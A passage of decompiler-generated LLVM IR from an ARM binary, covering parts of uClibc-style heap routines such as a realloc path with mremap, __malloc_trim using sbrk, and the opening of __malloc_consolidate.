  br label %dec_label_pc_127a4

dec_label_pc_125d0:                               ; preds = %dec_label_pc_125bc
  %v1_125d8.pre = load i32, i32* @r4, align 4
  %v1_125d0 = add i32 %v0_125c0, -4
  %v2_125d0 = inttoptr i32 %v1_125d0 to i32*
  %v3_125d0 = load i32, i32* %v2_125d0, align 4
  store i32 %v3_125d0, i32* @r3, align 4
  %v1_125d4 = add i32 %v0_125c0, -8
  store i32 %v1_125d4, i32* @r7, align 4
  %v9_125d8 = icmp eq i32 %v1_125d4, %v1_125d8.pre
  br i1 %v9_125d8, label %.thread2, label %dec_label_pc_125e8

.thread2:                                         ; preds = %dec_label_pc_125d0
  %v2_125dc = and i32 %v3_125d0, -4
  store i32 %v2_125dc, i32* %r3.global-to-local, align 4
  %v2_125e0 = load i32, i32* @r6, align 4
  %v3_125e0 = add i32 %v2_125e0, %v2_125dc
  store i32 %v3_125e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12670

dec_label_pc_125e8:                               ; preds = %dec_label_pc_125d0
  %v0_125e8 = load i32, i32* @r6, align 4
  %v1_125e8 = add i32 %v0_125e8, -4
  store i32 %v1_125e8, i32* @r2, align 4
  %v3_125ec = udiv i32 %v1_125e8, 4
  store i32 %v3_125ec, i32* @ip, align 4
  %tmp37 = and i32 %v1_125e8, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_125f4 = icmp ult i32 %v1_125e8, 36
  %v3_125f4 = or i1 %tmp38, %v2_125f4
  %v0_12604 = load i32, i32* @r5, align 4
  br i1 %v3_125f4, label %dec_label_pc_12604, label %dec_label_pc_125f8

dec_label_pc_125f8:                               ; preds = %dec_label_pc_125e8
  store i32 %v0_12604, i32* @r1, align 4
  %v0_125fc = call i32 @memcpy()
  store i32 %v0_125fc, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_12604:                               ; preds = %dec_label_pc_125e8
  %v1_12604 = inttoptr i32 %v0_12604 to i32*
  %v2_12604 = load i32, i32* %v1_12604, align 4
  store i32 %v2_12604, i32* %r3.global-to-local, align 4
  %v2_12608 = inttoptr i32 %v0_125c0 to i32*
  store i32 %v2_12604, i32* %v2_12608, align 4
  %v0_1260c = load i32, i32* @r5, align 4
  %v1_1260c = add i32 %v0_1260c, 4
  %v2_1260c = inttoptr i32 %v1_1260c to i32*
  %v3_1260c = load i32, i32* %v2_1260c, align 4
  store i32 %v3_1260c, i32* %r3.global-to-local, align 4
  %v1_12610 = load i32, i32* %r1.global-to-local, align 4
  %v2_12610 = add i32 %v1_12610, 4
  %v3_12610 = inttoptr i32 %v2_12610 to i32*
  store i32 %v3_1260c, i32* %v3_12610, align 4
  %v0_12614 = load i32, i32* @r5, align 4
  %v1_12614 = add i32 %v0_12614, 8
  %v2_12614 = inttoptr i32 %v1_12614 to i32*
  %v3_12614 = load i32, i32* %v2_12614, align 4
  store i32 %v3_12614, i32* %r3.global-to-local, align 4
  %v0_12618 = load i32, i32* @ip, align 4
  %v1_1261c = load i32, i32* %r1.global-to-local, align 4
  %v2_1261c = add i32 %v1_1261c, 8
  %v3_1261c = inttoptr i32 %v2_1261c to i32*
  store i32 %v3_12614, i32* %v3_1261c, align 4
  %tmp39 = icmp ult i32 %v0_12618, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_12624

dec_label_pc_12624:                               ; preds = %dec_label_pc_12604
  %v0_12624 = load i32, i32* @r5, align 4
  %v1_12624 = add i32 %v0_12624, 12
  %v2_12624 = inttoptr i32 %v1_12624 to i32*
  %v3_12624 = load i32, i32* %v2_12624, align 4
  store i32 %v3_12624, i32* %r3.global-to-local, align 4
  %v1_12628 = load i32, i32* %r1.global-to-local, align 4
  %v2_12628 = add i32 %v1_12628, 12
  %v3_12628 = inttoptr i32 %v2_12628 to i32*
  store i32 %v3_12624, i32* %v3_12628, align 4
  %v0_1262c = load i32, i32* @r5, align 4
  %v1_1262c = add i32 %v0_1262c, 16
  %v2_1262c = inttoptr i32 %v1_1262c to i32*
  %v3_1262c = load i32, i32* %v2_1262c, align 4
  store i32 %v3_1262c, i32* %r3.global-to-local, align 4
  %v0_12630 = load i32, i32* @ip, align 4
  %v1_12634 = load i32, i32* %r1.global-to-local, align 4
  %v2_12634 = add i32 %v1_12634, 16
  %v3_12634 = inttoptr i32 %v2_12634 to i32*
  store i32 %v3_1262c, i32* %v3_12634, align 4
  %tmp40 = icmp ult i32 %v0_12630, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_1263c

dec_label_pc_1263c:                               ; preds = %dec_label_pc_12624
  %v0_1263c = load i32, i32* @r5, align 4
  %v1_1263c = add i32 %v0_1263c, 20
  %v2_1263c = inttoptr i32 %v1_1263c to i32*
  %v3_1263c = load i32, i32* %v2_1263c, align 4
  store i32 %v3_1263c, i32* %r3.global-to-local, align 4
  %v1_12640 = load i32, i32* %r1.global-to-local, align 4
  %v2_12640 = add i32 %v1_12640, 20
  %v3_12640 = inttoptr i32 %v2_12640 to i32*
  store i32 %v3_1263c, i32* %v3_12640, align 4
  %v0_12644 = load i32, i32* @r5, align 4
  %v1_12644 = add i32 %v0_12644, 24
  %v2_12644 = inttoptr i32 %v1_12644 to i32*
  %v3_12644 = load i32, i32* %v2_12644, align 4
  store i32 %v3_12644, i32* %r3.global-to-local, align 4
  %v1_12648 = load i32, i32* %r1.global-to-local, align 4
  %v2_12648 = add i32 %v1_12648, 24
  %v3_12648 = inttoptr i32 %v2_12648 to i32*
  store i32 %v3_12644, i32* %v3_12648, align 4
  %v0_1264c = load i32, i32* @ip, align 4
  %v7_1264c = icmp eq i32 %v0_1264c, 9
  br i1 %v7_1264c, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_1263c
  %v1_12650 = load i32, i32* @r5, align 4
  %v2_12650 = add i32 %v1_12650, 28
  %v3_12650 = inttoptr i32 %v2_12650 to i32*
  %v4_12650 = load i32, i32* %v3_12650, align 4
  store i32 %v4_12650, i32* %r3.global-to-local, align 4
  %v2_12654 = load i32, i32* %r1.global-to-local, align 4
  %v3_12654 = add i32 %v2_12654, 28
  %v4_12654 = inttoptr i32 %v3_12654 to i32*
  store i32 %v4_12650, i32* %v4_12654, align 4
  %v1_12658 = load i32, i32* @r5, align 4
  %v2_12658 = add i32 %v1_12658, 32
  %v3_12658 = inttoptr i32 %v2_12658 to i32*
  %v4_12658 = load i32, i32* %v3_12658, align 4
  store i32 %v4_12658, i32* %r3.global-to-local, align 4
  %v2_1265c = load i32, i32* %r1.global-to-local, align 4
  %v3_1265c = add i32 %v2_1265c, 32
  %v4_1265c = inttoptr i32 %v3_1265c to i32*
  store i32 %v4_12658, i32* %v4_1265c, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_1263c, %dec_label_pc_12624, %dec_label_pc_12604, %dec_label_pc_125f8, %bb32
  %v0_12660 = load i32, i32* @r5, align 4
  store i32 %v0_12660, i32* @r0, align 4
  %v0_12664 = call i32 @free()
  store i32 %v0_12664, i32* %r0.global-to-local, align 4
  %v0_12668 = load i32, i32* @r7, align 4
  %v1_12668 = add i32 %v0_12668, 8
  store i32 %v1_12668, i32* @r4, align 4
  br label %dec_label_pc_127a4

dec_label_pc_12670:                               ; preds = %bb30, %.thread2, %dec_label_pc_125b0
  %v0_12684 = phi i32 [ %v3_125e0, %.thread2 ], [ %v1_124f8, %bb30 ], [ %v1_12670.pre, %dec_label_pc_125b0 ]
  %v0_12670 = load i32, i32* @sb, align 4
  %v2_12670 = sub i32 %v0_12684, %v0_12670
  store i32 %v2_12670, i32* %r1.global-to-local, align 4
  %v0_12678 = load i32, i32* @sl, align 4
  %v1_12678 = add i32 %v0_12678, 4
  %v2_12678 = inttoptr i32 %v1_12678 to i32*
  %v3_12678 = load i32, i32* %v2_12678, align 4
  %tmp41 = icmp ugt i32 %v2_12670, 15
  %v1_126a0 = urem i32 %v3_12678, 2
  store i32 %v1_126a0, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_126a0, label %dec_label_pc_12680

dec_label_pc_12680:                               ; preds = %dec_label_pc_12670
  %v2_12684 = or i32 %v1_126a0, %v0_12684
  store i32 %v2_12684, i32* %r3.global-to-local, align 4
  store i32 %v2_12684, i32* %v2_12678, align 4
  %v0_1268c = load i32, i32* @sl, align 4
  %v1_1268c = load i32, i32* %r0.global-to-local, align 4
  %v2_1268c = add i32 %v1_1268c, %v0_1268c
  store i32 %v2_1268c, i32* %r2.global-to-local, align 4
  %v1_12690 = add i32 %v2_1268c, 4
  %v2_12690 = inttoptr i32 %v1_12690 to i32*
  %v3_12690 = load i32, i32* %v2_12690, align 4
  %v1_12694 = or i32 %v3_12690, 1
  store i32 %v1_12694, i32* %r3.global-to-local, align 4
  store i32 %v1_12694, i32* %v2_12690, align 4
  br label %dec_label_pc_126d0

dec_label_pc_126a0:                               ; preds = %dec_label_pc_12670
  %v2_126a4 = add i32 %v0_12678, %v0_12670
  store i32 %v2_126a4, i32* %r0.global-to-local, align 4
  %v2_126a8 = or i32 %v1_126a0, %v0_12670
  store i32 %v2_126a8, i32* %r3.global-to-local, align 4
  %v1_126ac = or i32 %v2_12670, 1
  store i32 %v1_126ac, i32* %r2.global-to-local, align 4
  store i32 %v2_126a8, i32* %v2_12678, align 4
  %v0_126b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_126b4 = load i32, i32* %r0.global-to-local, align 4
  %v2_126b4 = add i32 %v1_126b4, 4
  %v3_126b4 = inttoptr i32 %v2_126b4 to i32*
  store i32 %v0_126b4, i32* %v3_126b4, align 4
  %v0_126b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_126b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_126b8 = add i32 %v1_126b8, %v0_126b8
  store i32 %v2_126b8, i32* %r2.global-to-local, align 4
  %v1_126bc = add i32 %v2_126b8, 4
  %v2_126bc = inttoptr i32 %v1_126bc to i32*
  %v3_126bc = load i32, i32* %v2_126bc, align 4
  %v1_126c0 = or i32 %v3_126bc, 1
  store i32 %v1_126c0, i32* %r3.global-to-local, align 4
  store i32 %v1_126c0, i32* %v2_126bc, align 4
  %v0_126c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_126c8 = add i32 %v0_126c8, 8
  store i32 %v1_126c8, i32* @r0, align 4
  %v0_126cc = call i32 @free()
  store i32 %v0_126cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_126d0

dec_label_pc_126d0:                               ; preds = %dec_label_pc_12680, %dec_label_pc_126a0
  %v0_126d0 = load i32, i32* @sl, align 4
  %v1_126d0 = add i32 %v0_126d0, 8
  store i32 %v1_126d0, i32* @r4, align 4
  br label %dec_label_pc_127a4

dec_label_pc_126d8:                               ; preds = %bb29
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r1.global-to-local, align 4
  %v4_126e0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 64) to i32*), align 4
  store i32 %v4_126e0, i32* @r8, align 4
  %v2_126e4 = inttoptr i32 %v1_124f4 to i32*
  %v3_126e4 = load i32, i32* %v2_126e4, align 4
  store i32 %v3_126e4, i32* @r4, align 4
  %v1_126e8 = add i32 %v4_126e0, 860
  %v2_126e8 = inttoptr i32 %v1_126e8 to i32*
  %v3_126e8 = load i32, i32* %v2_126e8, align 4
  %v1_126ec = add i32 %v3_126e4, 4
  %v1_126f0 = add i32 %v3_126e8, -1
  store i32 %v1_126f0, i32* %r2.global-to-local, align 4
  %v2_126f4 = add i32 %v1_126ec, %v1_126f0
  %v1_126f8 = load i32, i32* @sb, align 4
  %v2_126f8 = add i32 %v2_126f4, %v1_126f8
  store i32 %v2_126f8, i32* %r3.global-to-local, align 4
  %v2_126fc = sub i32 0, %v3_126e8
  %v3_126fc = and i32 %v2_126f8, %v2_126fc
  store i32 %v3_126fc, i32* @r7, align 4
  %v2_12700 = sub i32 %v3_126fc, %v3_126e4
  store i32 %v2_12700, i32* @fp, align 4
  %v9_12704 = icmp eq i32 %v1_124f8, %v2_12700
  br i1 %v9_12704, label %dec_label_pc_12778, label %dec_label_pc_1270c

dec_label_pc_1270c:                               ; preds = %dec_label_pc_126d8
  %v2_1270c = sub i32 %v1_124f4, %v3_126e4
  store i32 %v2_1270c, i32* %r0.global-to-local, align 4
  %v2_12710 = add i32 %v3_126e4, %v1_124f8
  store i32 %v2_12710, i32* %r1.global-to-local, align 4
  store i32 %v3_126fc, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_1271c = call i32 @mremap(i32 %v2_1270c, i32 %v2_12710, i32 %v3_126fc, i32 1)
  store i32 %v4_1271c, i32* %r0.global-to-local, align 4
  %v7_12720 = icmp eq i32 %v4_1271c, -1
  br i1 %v7_12720, label %dec_label_pc_1276c, label %dec_label_pc_12728

dec_label_pc_12728:                               ; preds = %dec_label_pc_1270c
  %v1_12728 = load i32, i32* @r4, align 4
  %v2_12728 = add i32 %v1_12728, %v4_1271c
  store i32 %v2_12728, i32* %r0.global-to-local, align 4
  %v0_1272c = load i32, i32* @fp, align 4
  %v1_1272c = or i32 %v0_1272c, 2
  store i32 %v1_1272c, i32* %r3.global-to-local, align 4
  %v2_12730 = add i32 %v2_12728, 4
  %v3_12730 = inttoptr i32 %v2_12730 to i32*
  store i32 %v1_1272c, i32* %v3_12730, align 4
  %v0_12734 = load i32, i32* @r8, align 4
  %v1_12734 = add i32 %v0_12734, 868
  %v2_12734 = inttoptr i32 %v1_12734 to i32*
  %v3_12734 = load i32, i32* %v2_12734, align 4
  store i32 %v3_12734, i32* %r3.global-to-local, align 4
  %v1_12738 = add i32 %v0_12734, 880
  %v2_12738 = inttoptr i32 %v1_12738 to i32*
  %v3_12738 = load i32, i32* %v2_12738, align 4
  store i32 %v3_12738, i32* %r2.global-to-local, align 4
  %v0_1273c = load i32, i32* @r6, align 4
  %v2_1273c = sub i32 %v3_12734, %v0_1273c
  store i32 %v2_1273c, i32* %r3.global-to-local, align 4
  %v1_12740 = load i32, i32* @r7, align 4
  %v2_12740 = add i32 %v1_12740, %v2_1273c
  store i32 %v2_12740, i32* %r1.global-to-local, align 4
  %v1_12744 = add i32 %v0_12734, 872
  %v2_12744 = inttoptr i32 %v1_12744 to i32*
  %v3_12744 = load i32, i32* %v2_12744, align 4
  store i32 %v3_12744, i32* %r3.global-to-local, align 4
  %v1_1274c = add i32 %v0_12734, 884
  %v2_1274c = inttoptr i32 %v1_1274c to i32*
  %v3_1274c = load i32, i32* %v2_1274c, align 4
  store i32 %v3_1274c, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_12740, %v3_12738
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_12728
  store i32 %v2_12740, i32* %v2_12738, align 4
  %v0_12754.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_12754.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_12728, %bb33
  %v1_12754 = phi i32 [ %v0_12734, %dec_label_pc_12728 ], [ %v1_12754.pre, %bb33 ]
  %v0_12754 = phi i32 [ %v2_12740, %dec_label_pc_12728 ], [ %v0_12754.pre, %bb33 ]
  %v2_12754 = add i32 %v1_12754, 868
  %v3_12754 = inttoptr i32 %v2_12754 to i32*
  store i32 %v0_12754, i32* %v3_12754, align 4
  %v0_12758 = load i32, i32* %r1.global-to-local, align 4
  %v1_12758 = load i32, i32* %r3.global-to-local, align 4
  %v2_12758 = add i32 %v1_12758, %v0_12758
  store i32 %v2_12758, i32* %r1.global-to-local, align 4
  %v1_1275c = load i32, i32* %r2.global-to-local, align 4
  %v0_12760 = load i32, i32* %r0.global-to-local, align 4
  %v1_12760 = add i32 %v0_12760, 8
  store i32 %v1_12760, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_12758, %v1_1275c
  br i1 %tmp43, label %bb35, label %dec_label_pc_127a4

bb35:                                             ; preds = %bb34
  %v5_12764 = load i32, i32* @r8, align 4
  %v6_12764 = add i32 %v5_12764, 884
  %v7_12764 = inttoptr i32 %v6_12764 to i32*
  store i32 %v2_12758, i32* %v7_12764, align 4
  br label %dec_label_pc_127a4

dec_label_pc_1276c:                               ; preds = %dec_label_pc_1270c
  %v0_1276c = load i32, i32* @sb, align 4
  %v1_1276c = add i32 %v0_1276c, 4
  store i32 %v1_1276c, i32* %r3.global-to-local, align 4
  %v0_12770 = load i32, i32* @r6, align 4
  %v3_12770 = icmp ult i32 %v0_12770, %v1_1276c
  br i1 %v3_12770, label %dec_label_pc_12780, label %dec_label_pc_1276c.dec_label_pc_12778_crit_edge

dec_label_pc_1276c.dec_label_pc_12778_crit_edge:  ; preds = %dec_label_pc_1276c
  %v0_12778.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12778

dec_label_pc_12778:                               ; preds = %dec_label_pc_1276c.dec_label_pc_12778_crit_edge, %dec_label_pc_126d8
  %v0_12778 = phi i32 [ %v0_12778.pre, %dec_label_pc_1276c.dec_label_pc_12778_crit_edge ], [ %v0_124e0, %dec_label_pc_126d8 ]
  store i32 %v0_12778, i32* @r4, align 4
  br label %dec_label_pc_127a4

dec_label_pc_12780:                               ; preds = %dec_label_pc_1276c
  %v1_12780 = add i32 %v0_1276c, -7
  store i32 %v1_12780, i32* @r0, align 4
  %v0_12784 = call i32 @malloc()
  store i32 %v0_12784, i32* @r0, align 4
  store i32 %v0_12784, i32* @r4, align 4
  %v2_12788 = icmp eq i32 %v0_12784, 0
  br i1 %v2_12788, label %dec_label_pc_127a4, label %dec_label_pc_12790

dec_label_pc_12790:                               ; preds = %dec_label_pc_12780
  %v0_12790 = load i32, i32* @r6, align 4
  %v1_12790 = add i32 %v0_12790, -8
  store i32 %v1_12790, i32* @r2, align 4
  %v0_12794 = load i32, i32* @r5, align 4
  store i32 %v0_12794, i32* @r1, align 4
  %v0_12798 = call i32 @memcpy()
  %v0_1279c = load i32, i32* @r5, align 4
  store i32 %v0_1279c, i32* @r0, align 4
  %v0_127a0 = call i32 @free()
  store i32 %v0_127a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_127a4

dec_label_pc_127a4:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_12780, %dec_label_pc_12778, %dec_label_pc_126d0, %.thread6, %dec_label_pc_12540, %dec_label_pc_12790
  store i32 %v2_1248c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r2.global-to-local, align 4
  %v4_127b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 44) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_127b4)
  br label %dec_label_pc_127c0

dec_label_pc_127c0:                               ; preds = %dec_label_pc_124c0, %dec_label_pc_12468, %dec_label_pc_12450, %dec_label_pc_127a4
  %v0_127c0 = load i32, i32* @r4, align 4
  store i32 %v0_127c0, i32* %r0.global-to-local, align 4
  store i32 %v3_12430, i32* @r4, align 4
  store i32 %v6_12430, i32* @r5, align 4
  store i32 %v9_12430, i32* @r6, align 4
  store i32 %v12_12430, i32* @r7, align 4
  store i32 %v15_12430, i32* @r8, align 4
  store i32 %v18_12430, i32* @sb, align 4
  store i32 %v21_12430, i32* @sl, align 4
  store i32 %v24_12430, i32* @fp, align 4
  store i32 %v27_12430, i32* @lr, align 4
  ret i32 %v0_127c0

; uselistorder directives
  uselistorder i32 %v2_12758, { 1, 0, 2 }
  uselistorder i32 %v2_12740, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1271c, { 1, 0, 2 }
  uselistorder i32 %v3_126fc, { 1, 0, 2, 3 }
  uselistorder i32 %v1_126a0, { 2, 1, 0 }
  uselistorder i32 %v2_12670, { 1, 0, 2 }
  uselistorder i32 %v0_12604, { 1, 0 }
  uselistorder i32 %v0_125c0, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_12524, { 0, 2, 1, 3 }
  uselistorder i32 %v2_1251c, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_12500, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_124f8, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_124f4, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_124e4, { 1, 0 }
  uselistorder i32 %v0_124e0, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_124b8, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 11, 7, 8, 9, 10, 21, 12, 14, 13, 20, 22, 15, 16, 17, 18, 19, 25, 24, 23, 26, 27 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_127c0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_127a4, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_126d0, { 1, 0 }
  uselistorder label %dec_label_pc_12670, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_125bc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_125b0, { 1, 0 }
  uselistorder label %dec_label_pc_125ac, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_127d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_127d4:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_127d4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_127d4, label %.thread3, label %.thread5

.thread3:                                         ; preds = %dec_label_pc_127d4
  store i32 0, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 0)
  %v0_127e8.pr.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_127e8.pr.pr.pr, label %bb, label %.thread3..thread5_crit_edge

.thread3..thread5_crit_edge:                      ; preds = %.thread3
  %v4_127ec.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread5

bb:                                               ; preds = %.thread3
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread3..thread5_crit_edge, %dec_label_pc_127d4, %bb
  %v4_127ec = phi i32 [ %v4_127ec.pre, %.thread3..thread5_crit_edge ], [ %arg1, %dec_label_pc_127d4 ], [ 0, %bb ]
  ret i32 %v4_127ec

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_127f0 = add i32 %arg2, 44
  %v2_127f0 = inttoptr i32 %v1_127f0 to i32*
  %v3_127f0 = load i32, i32* %v2_127f0, align 4
  %v3_127f4 = load i32, i32* @r4, align 4
  store i32 %v3_127f4, i32* %stack_var_-20, align 4
  %v12_127f4 = load i32, i32* @r7, align 4
  %v1_127f8 = add i32 %v3_127f0, 4
  %v2_127f8 = inttoptr i32 %v1_127f8 to i32*
  %v3_127f8 = load i32, i32* %v2_127f8, align 4
  %v1_127fc = add i32 %arg2, 860
  %v2_127fc = inttoptr i32 %v1_127fc to i32*
  %v3_127fc = load i32, i32* %v2_127fc, align 4
  store i32 %v3_127fc, i32* @r4, align 4
  %v1_12800 = and i32 %v3_127f8, -4
  store i32 %v1_12800, i32* @r6, align 4
  %v1_12804 = add i32 %v1_12800, -17
  %v2_12808 = add i32 %v1_12804, %v3_127fc
  store i32 %arg2, i32* @r5, align 4
  %v2_12814 = sub i32 %v2_12808, %arg1
  store i32 %v3_127fc, i32* %r1.global-to-local, align 4
  %v2_1281c = udiv i32 %v2_12814, %v3_127fc
  %v1_12820 = add i32 %v2_1281c, -1
  store i32 %v1_12820, i32* %r0.global-to-local, align 4
  %v2_12824 = mul i32 %v1_12820, %v3_127fc
  store i32 %v2_12824, i32* @r7, align 4
  %v2_12828 = icmp eq i32 %v2_12824, 0
  store i1 %v2_12828, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_12824, 1
  br i1 %tmp8, label %dec_label_pc_12890, label %dec_label_pc_12830

dec_label_pc_12830:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12834 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12834, i32* %r0.global-to-local, align 4
  %v0_12838 = load i32, i32* @r5, align 4
  %v1_12838 = add i32 %v0_12838, 44
  %v2_12838 = inttoptr i32 %v1_12838 to i32*
  %v3_12838 = load i32, i32* %v2_12838, align 4
  %v0_1283c = load i32, i32* @r6, align 4
  %v2_1283c = add i32 %v0_1283c, %v3_12838
  %v9_12840 = icmp eq i32 %v1_12834, %v2_1283c
  store i1 %v9_12840, i1* @cpsr_z, align 1
  store i32 %v1_12834, i32* @r4, align 4
  br i1 %v9_12840, label %dec_label_pc_1284c, label %dec_label_pc_12890

dec_label_pc_1284c:                               ; preds = %dec_label_pc_12830
  %v0_1284c = load i32, i32* @r7, align 4
  %v1_1284c = sub i32 0, %v0_1284c
  store i32 %v1_1284c, i32* %r0.global-to-local, align 4
  %v1_12850 = call i32 @__GI_sbrk(i32 %v1_1284c)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12858 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12858, i32* %r0.global-to-local, align 4
  %v7_1285c = icmp eq i32 %v1_12858, -1
  store i1 %v7_1285c, i1* @cpsr_z, align 1
  br i1 %v7_1285c, label %dec_label_pc_12890, label %dec_label_pc_12864

dec_label_pc_12864:                               ; preds = %dec_label_pc_1284c
  %v0_12864 = load i32, i32* @r4, align 4
  %v2_12864 = sub i32 %v0_12864, %v1_12858
  store i32 %v2_12864, i32* %r0.global-to-local, align 4
  %v9_12864 = icmp eq i32 %v0_12864, %v1_12858
  store i1 %v9_12864, i1* @cpsr_z, align 1
  br i1 %v9_12864, label %dec_label_pc_12890, label %dec_label_pc_1286c

dec_label_pc_1286c:                               ; preds = %dec_label_pc_12864
  %v0_1286c = load i32, i32* @r5, align 4
  %v1_1286c = add i32 %v0_1286c, 872
  %v2_1286c = inttoptr i32 %v1_1286c to i32*
  %v3_1286c = load i32, i32* %v2_1286c, align 4
  %v1_12870 = load i32, i32* @r6, align 4
  %v2_12870 = sub i32 %v1_12870, %v2_12864
  store i32 %v2_12870, i32* %r2.global-to-local, align 4
  %v1_12874 = add i32 %v0_1286c, 44
  %v2_12874 = inttoptr i32 %v1_12874 to i32*
  %v3_12874 = load i32, i32* %v2_12874, align 4
  store i32 %v3_12874, i32* %r1.global-to-local, align 4
  %v2_12878 = sub i32 %v3_1286c, %v2_12864
  %v1_1287c = or i32 %v2_12870, 1
  store i32 %v1_1287c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_12878, i32* %v2_1286c, align 4
  %v0_12888 = load i32, i32* %r2.global-to-local, align 4
  %v1_12888 = load i32, i32* %r1.global-to-local, align 4
  %v2_12888 = add i32 %v1_12888, 4
  %v3_12888 = inttoptr i32 %v2_12888 to i32*
  store i32 %v0_12888, i32* %v3_12888, align 4
  %v1_1289c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12894

dec_label_pc_12890:                               ; preds = %dec_label_pc_12830, %dec_label_pc_12864, %dec_label_pc_1284c, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12894

dec_label_pc_12894:                               ; preds = %dec_label_pc_1286c, %dec_label_pc_12890
  %v1_1289c = phi i32 [ %v1_1289c.pre, %dec_label_pc_1286c ], [ 0, %dec_label_pc_12890 ]
  %v2_12898 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12898, i32* @r4, align 4
  store i32 %v12_127f4, i32* @r7, align 4
  ret i32 %v1_1289c

; uselistorder directives
  uselistorder i1 %v7_1285c, { 1, 0 }
  uselistorder i32 %v1_12858, { 2, 1, 0, 3 }
  uselistorder i32 %v3_127fc, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_12894, { 1, 0 }
  uselistorder label %dec_label_pc_12890, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
